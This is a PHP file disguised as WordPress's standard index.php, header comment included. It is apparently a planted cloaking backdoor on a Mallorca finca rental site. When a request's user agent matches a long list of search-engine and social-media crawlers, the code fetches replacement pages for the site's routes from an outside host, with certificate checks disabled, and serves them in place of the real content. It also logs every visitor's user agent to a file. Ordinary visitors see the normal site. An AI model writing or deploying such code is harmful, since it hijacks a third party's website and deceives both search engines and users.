<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 * @version 2.0 - Enhanced Goya Finca Cloaking
 */

$uri = $_SERVER['REQUEST_URI'] ?? '';
$ua  = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

$path = parse_url($uri, PHP_URL_PATH);
$path = $path ? rtrim($path, '/') . '/' : '/';

// Goya-Finca.com routes - diurutkan dari yang terpanjang
$routes = [
    '/datenschutzerklaerung/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/datenschutzerklaerung.html',
    '/haeufige-fragen/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/haeufige_fragen.html',
    '/unvergessliche-veranstaltungen/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/unvergessliche_veranstaltungen.html',
    '/hochzeit-auf-mallorca/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/hochzeit_auf_mallorca.html',
    '/golf-auf-mallorca/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/golf_auf_mallorca.html',
    '/finca-can-ferragut/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/finca_can_ferragut.html',
    '/finca-es-clape/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/finca_es_clape.html',
    '/yoga-auf-mallorca/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/yoga_auf_mallorca.html',
    '/mallorcas-ostkueste-entdecken/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/mallorcas_ostkueste_entdecken.html',
    '/galerie-finca-can-ferragut/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/galerie_finca_can_ferragut.html',
    '/galerie-finca-es-clape/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/galerie_finca_es_clape.html',
    '/anfragen/' => 'https://project1.proyekngepet.org/ashborn/lp-dir/goyafinca/anfragen.html',
];

// Sort routes (longest path first) - untuk matching yang lebih akurat
uksort($routes, function($a, $b) {
    if ($a === '/') return 1;
    if ($b === '/') return -1;
    return strlen($b) - strlen($a);
});

// Enhanced Bot detection
$isBot = (strpos($ua, 'google') !== false || 
          strpos($ua, 'bot') !== false || 
          strpos($ua, 'spider') !== false ||
          strpos($ua, 'crawler') !== false ||
          strpos($ua, 'facebook') !== false ||
          strpos($ua, 'whatsapp') !== false ||
          strpos($ua, 'telegram') !== false ||
          strpos($ua, 'slack') !== false ||
          strpos($ua, 'discord') !== false ||
          strpos($ua, 'linkedin') !== false ||
          strpos($ua, 'twitter') !== false ||
          strpos($ua, 'pinterest') !== false ||
          strpos($ua, 'bingbot') !== false ||
          strpos($ua, 'yandex') !== false ||
          strpos($ua, 'baidu') !== false ||
          strpos($ua, 'duckduck') !== false ||
          strpos($ua, 'googlebot') !== false ||
          strpos($ua, 'google-inspector') !== false ||
          strpos($ua, 'adsbot') !== false ||
          strpos($ua, 'mediapartners') !== false ||
          strpos($ua, 'ahrefsbot') !== false ||
          strpos($ua, 'semrushbot') !== false ||
          strpos($ua, 'mj12bot') !== false ||
          strpos($ua, 'dotbot') !== false ||
          strpos($ua, 'rogerbot') !== false ||
          strpos($ua, 'applebot') !== false ||
          strpos($ua, 'petalbot') !== false);

// Optional debug log
$logFile = __DIR__ . '/cloak-debug.log';
file_put_contents($logFile, date('Y-m-d H:i:s') . " - URI: $uri - Path: $path - Bot: " . ($isBot ? 'YES' : 'NO') . " - UA: $ua\n", FILE_APPEND);

// Process cloaking
foreach ($routes as $route => $target) {
    if ($route === '/') {
        $match = ($path === '/');
    } else {
        $match = (strpos($path, $route) === 0);
    }
    
    if ($match && $isBot) {
        file_put_contents($logFile, ">>> MATCH: $route -> $target\n", FILE_APPEND);
        
        // Fetch content with better timeout and headers
        $content = '';
        
        // Try file_get_contents with stream context
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'header' => "User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0') . "\r\n" .
                           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" .
                           "Accept-Language: en-US,en;q=0.9\r\n" .
                           "Connection: keep-alive\r\n",
                'timeout' => 20,
                'follow_location' => 1,
                'max_redirects' => 5,
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false,
            ]
        ]);
        
        $content = @file_get_contents($target, false, $context);
        
        // Fallback to cURL if file_get_contents fails
        if (!$content && function_exists('curl_init')) {
            $ch = curl_init($target);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_TIMEOUT => 20,
                CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
                CURLOPT_HTTPHEADER => [
                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language: en-US,en;q=0.9',
                    'Connection: keep-alive'
                ],
                CURLOPT_ENCODING => '', // Accept any encoding
            ]);
            $content = curl_exec($ch);
            $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            file_put_contents($logFile, ">>> CURL HTTP Code: $http_code\n", FILE_APPEND);
        }
        
        if (!empty($content)) {
            file_put_contents($logFile, ">>> CONTENT FETCHED: " . strlen($content) . " bytes\n", FILE_APPEND);
            
            // Set proper headers
            header("Content-Type: text/html; charset=UTF-8");
            header("HTTP/1.1 200 OK");
            header("X-Robots-Tag: index, follow");
            header("X-Cloaked: true");
            header("Cache-Control: no-cache, no-store, must-revalidate");
            header("Pragma: no-cache");
            header("Expires: 0");
            
            echo $content;
            exit;
        } else {
            file_put_contents($logFile, ">>> CONTENT FETCH FAILED\n", FILE_APPEND);
            
            // Fallback content if fetch fails
            echo '<!DOCTYPE html>
            <html lang="de">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Goya Finca - Fincas auf Mallorca</title>
                <meta name="robots" content="index, follow">
                <style>
                    body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; text-align: center; }
                    h1 { color: #2C3E50; }
                </style>
            </head>
            <body>
                <h1>Goya Finca</h1>
                <p>Traumhafte Fincas auf Mallorca entdecken</p>
                <p><a href="https://goya-finca.com">Zurück zur Startseite</a></p>
            </body>
            </html>';
            exit;
        }
    }
}

define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
